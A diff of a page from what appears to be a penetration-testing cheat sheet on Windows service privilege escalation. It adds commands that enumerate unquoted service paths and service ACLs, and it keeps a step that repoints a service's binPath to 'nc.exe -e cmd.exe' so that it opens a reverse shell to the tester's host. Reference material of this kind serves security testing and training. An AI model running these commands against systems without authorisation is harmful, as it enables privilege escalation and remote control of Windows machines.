@@ -4,7 +4,7 @@
     <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<title>Server Operators | TLDRBins</title>
+<title>Windows Services | TLDRBins</title>
 <meta name="robots" content='noindex, nofollow'>
 <meta name="description" content="">
 <meta name="generator" content="hugo-index">
@@ -25,7 +25,7 @@
     </a>
     <span class="hl">/</span>
     <a href="https://tldrbins.github.io/server_operators/">
-      <span>Server Operators</span>
+      <span>Windows Services</span>
     </a>
   </h1>
   <div class="js-toggle-wrapper">
@@ -176,9 +176,11 @@
   
   <li><a href="https://tldrbins.github.io/@privilege-escalation/">Privilege Escalation</a></li>
   
-  <li><a href="https://tldrbins.github.io/@service/">Service</a></li>
+  <li><a href="https://tldrbins.github.io/@services/">Services</a></li>
   
   <li><a href="https://tldrbins.github.io/@reverse-shell/">Reverse Shell</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@unquoted-service-path/">Unquoted Service Path</a></li>
   
 </ul>
 <hr>
@@ -324,7 +326,27 @@ body.dark-mode #dynamicFormContainer button:hover {
     background: #424242;
 }
 </style>
-  <h3 id="abuse-1-change-service-path">Abuse #1: Change service path</h3>
+  <h3 id="check-unquoted-service-path">Check unquoted service path</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">cmd.exe /c &#39;wmic service get name,displayname,pathname,startmode |findstr /i &#34;auto&#34; |findstr /i /v &#34;C:\windows\\&#34; |findstr /i /v &#34;&#34;&#34;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\Users\user1&gt; cmd.exe /c &#39;wmic service get name,displayname,pathname,startmode |findstr /i &#34;auto&#34; |findstr /i /v &#34;C:\windows\\&#34; |findstr /i /v &#34;&#34;&#34;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">WC Assistant    WCAssistantService    C:\Program Files (x86)\Lavasoft\Web Companion\Application\Lavasoft.WCAssistant.WinService.exe    Auto 
+</span></span></span></code></pre></div><h3 id="check-service-acls">Check service ACLs</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\Get-ServiceAcl
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">&#34;&lt;SERVICE&gt;&#34; | Get-ServiceAcl | Select -ExpandProperty Access
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS &gt; &#34;SomeService&#34; | Get-ServiceAcl | select -ExpandProperty Access
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">ServiceRights     : QueryConfig, ChangeConfig, QueryStatus, EnumerateDependents, Start, Stop, Interrogate, ReadControl
+</span></span></span><span class="line"><span class="cl"><span class="go">AccessControlType : AccessAllowed
+</span></span></span><span class="line"><span class="cl"><span class="go">IdentityReference : COMPUTER-MS01\user
+</span></span></span><span class="line"><span class="cl"><span class="go">IsInherited       : False
+</span></span></span><span class="line"><span class="cl"><span class="go">InheritanceFlags  : None
+</span></span></span><span class="line"><span class="cl"><span class="go">PropagationFlags  : None
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...[SNIP]...
+</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://raw.githubusercontent.com/Sambal0x/tools/refs/heads/master/Get-ServiceAcl.ps1">Get-ServiceAcl.ps1</a></em></small></p>
+<h3 id="abuse-1-change-service-path">Abuse #1: Change service path</h3>
 <h4 id="1-change-service-path">1. Change service path</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Assume nc.exe is uploaded
 </span></span><span class="line"><span class="cl"><span class="go">sc.exe config &lt;SERVICE&gt; binPath= &#34;C:\ProgramData\nc.exe -e cmd.exe &lt;LOCAL_IP&gt; &lt;LOCAL_PORT&gt;&#34;
@@ -338,7 +360,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">The service has not been started.
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Start service
-</span></span><span class="line"><span class="cl"><span class="go">sc.exe stop &lt;SERVICE&gt;
+</span></span><span class="line"><span class="cl"><span class="go">sc.exe start &lt;SERVICE&gt;
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\windows\tasks&gt; sc.exe start VSS
 </span></span></span><span class="line"><span class="cl"><span class="go">[SC] StartService FAILED 1053:
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
